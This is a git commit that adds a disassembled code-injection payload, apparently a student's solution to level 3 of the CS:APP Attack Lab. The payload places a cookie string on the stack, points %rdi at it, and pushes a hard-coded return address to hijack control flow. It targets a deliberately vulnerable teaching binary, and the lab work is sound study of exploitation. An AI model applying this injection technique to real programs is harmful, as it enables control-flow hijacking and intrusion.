5d3177118fe805c975db2e1f98219adac0af17c5
srdczk <pp@qq.com>
2019-12-30 22:44:32 +0800

    level 1 - 3

---
+++ attacklab/level3.s
@@ -0,0 +1,14 @@
+
+level3.o：     文件格式 elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 04 24 35 39 62 	movq   $0x39623935,(%rsp)
+   7:	39 
+   8:	48 c7 44 24 04 39 37 	movq   $0x61663739,0x4(%rsp)
+   f:	66 61 
+  11:	48 89 e7             	mov    %rsp,%rdi
+  14:	68 fa 18 40 00       	pushq  $0x4018fa
+  19:	c3                   	retq   
